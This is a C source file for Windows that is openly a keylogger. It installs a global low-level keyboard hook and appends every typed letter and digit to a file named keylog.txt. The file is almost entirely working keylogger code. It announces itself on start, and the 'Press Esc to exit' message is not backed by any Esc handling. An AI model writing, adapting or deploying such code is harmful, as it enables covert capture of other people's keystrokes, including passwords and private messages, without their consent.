#include <stdio.h>
#include <windows.h>

#define LOG_FILE "keylog.txt"

// Function to check if a key is an alphanumeric character and convert it to a char
char KeyToChar(DWORD vkCode, BOOL shiftPressed) {
    // Check if the key code is within the alphabetical range
    if (vkCode >= 0x41 && vkCode <= 0x5A) {
        if (shiftPressed) {
            return (char)vkCode; // Uppercase letter
        } else {
            return (char)(vkCode + 32); // Convert to lowercase
        }
    }
    // Check if the key code is within the top row number keys
    if (vkCode >= 0x30 && vkCode <= 0x39) {
        if (!shiftPressed) {
            return (char)vkCode; // Number
        } else {
            // Handling shift+number for special characters can be added here
            // For simplicity, this example does not implement it
        }
    }
    // Add more conditions for other keys if needed
    return 0; // No character to return
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = p->vkCode;
        BOOL shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000; // Check if SHIFT key is pressed

        if (wParam == WM_KEYDOWN) {
            char c = KeyToChar(vkCode, shiftPressed);
            if (c != 0) { // If it's a character we care about
                FILE *file = fopen(LOG_FILE, "a+");
                if (file != NULL) {
                    fputc(c, file);
                    fclose(file);
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Set up the keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (keyboardHook == NULL) {
        printf("Failed to install hook!\n");
        return 1;
    }

    printf("Keylogger started. Press 'Esc' to exit.\n");

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}

